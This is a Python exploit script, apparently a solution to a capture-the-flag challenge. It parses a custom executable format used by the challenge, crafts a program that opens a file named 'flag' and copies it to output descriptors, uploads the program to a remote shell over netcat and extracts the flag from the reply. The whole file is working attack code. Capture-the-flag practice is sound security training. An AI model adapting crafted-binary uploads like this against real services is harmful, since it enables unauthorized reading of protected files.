#!/usr/bin/env python3

from nclib import netcat
import sys
import struct
import re

HEADER_SIZE = 16
DESTINATION_TO_UPDATE_SIZE = 8
EXTERNAL_SIZE = 264
EXPORT_SIZE = 260

def create_destination(addr, input, matching):
    return ((((addr << 1) ^ input) << 3) ^ matching) & (2**32-1)

INPUT_ONE = 0
INPUT_TWO = 1

MATCHING_ONE = 0
MATCHING_BOTH = 1
MATCHING_ANY = 2

BOTH_OUTPUT_MARKER = 1
ONE_OUTPUT_MARKER = 0


DEV_NULL_DESTINATION = create_destination(((1<<28)-5), INPUT_ONE, MATCHING_ONE)

def main():

    with open("./os", 'rb') as f:
        content = f.read()
    num_constant, num_to_fix, num_external_ref, num_exported = struct.unpack_from('<xxxxxxxxHHHH', content)

    start_instructions = HEADER_SIZE + (num_constant * DESTINATION_TO_UPDATE_SIZE) + (num_to_fix * DESTINATION_TO_UPDATE_SIZE) + (num_external_ref * EXTERNAL_SIZE) + (num_exported * EXPORT_SIZE)

    binary_instructions = content[start_instructions:]

    i = 0
    instruction_format = '<IIIBxxxqqIxxxx'
    open_instruction = None
    sdf_instruction = None
    for opcode, destination_1, destination_2, marker, literal_1, literal_2, instruction_literal in struct.iter_unpack(instruction_format, binary_instructions):
        # SDF
        if opcode == 31:
            if instruction_literal == 0:
                sdf_instruction = i
        elif opcode == 22:
            if instruction_literal == 0:
                open_instruction = i
        i += 1

    # need to construct a program that does:
    # open_instruction[0] = DUP "flag"
    # open_instruction[1] = DUP 0
    # for i = 10; i < 40; i++
    # sdf_instruction[0] = DUP i
    # sdf_instruction[1] = DUP 1

    instructions = b""
    flag = 0x67616C66
    num_instructions = 0
    instructions += struct.pack(instruction_format,
                                5,
                                create_destination(open_instruction, INPUT_ONE, MATCHING_BOTH),
                                DEV_NULL_DESTINATION,
                                ONE_OUTPUT_MARKER,
                                flag,
                                0,
                                1)
    instructions += struct.pack(instruction_format,
                                5,
                                create_destination(open_instruction, INPUT_TWO, MATCHING_BOTH),
                                DEV_NULL_DESTINATION,
                                ONE_OUTPUT_MARKER,
                                0,
                                0,
                                1)
    num_instructions += 2
    for i in range(5, 11):
        instructions += struct.pack(instruction_format,
                                    5,
                                    create_destination(sdf_instruction, INPUT_ONE, MATCHING_BOTH),
                                    DEV_NULL_DESTINATION,
                                    ONE_OUTPUT_MARKER,
                                    i,
                                    0,
                                    1)
        instructions += struct.pack(instruction_format,
                                    5,
                                    create_destination(sdf_instruction, INPUT_TWO, MATCHING_BOTH),
                                    DEV_NULL_DESTINATION,
                                    ONE_OUTPUT_MARKER,
                                    1,
                                    0,
                                    1)
        num_instructions += 2



    magic_bytes = b"sephiALD"
    num_constant = num_instructions
    num_to_fix = 0
    num_external_ref = 0
    num_exported = 0

    exploit = magic_bytes
    exploit += struct.pack('<HHHH',
                           num_constant,
                           num_to_fix,
                           num_external_ref,
                           num_exported)

    for i in range(num_constant):
        exploit += struct.pack('<IBxxx',
                               i,
                               1) # Here, 1 means leave constant the first destination
                                
    exploit += instructions

    with open('exploit', 'wb') as f:
        f.write(exploit)

    print(len(exploit))

    host = sys.argv[1]
    port = int(sys.argv[2])

    conn = netcat.Netcat((host, port))

    result = conn.recvuntil(b'debug@R3-S1$ ')

    conn.sendline(b"cat ->z")
    conn.send(exploit)
    conn.shutdown_wr()
    result = conn.recvuntil(b'debug@R3-S1$ ')
    result = conn.recvuntil(b'Goodbye')
    conn.close()

    conn = netcat.Netcat((host, port))

    result = conn.recvuntil(b'debug@R3-S1$ ')
    conn.sendline(b"z")
    result = conn.recvall(timeout=5)
    conn.close()
    flag = re.search(b'OOO{[^}]+}', result)
    print("FLAG: %s" % flag.group(0))

    sys.exit(0)


if __name__ == '__main__':
    main()
    

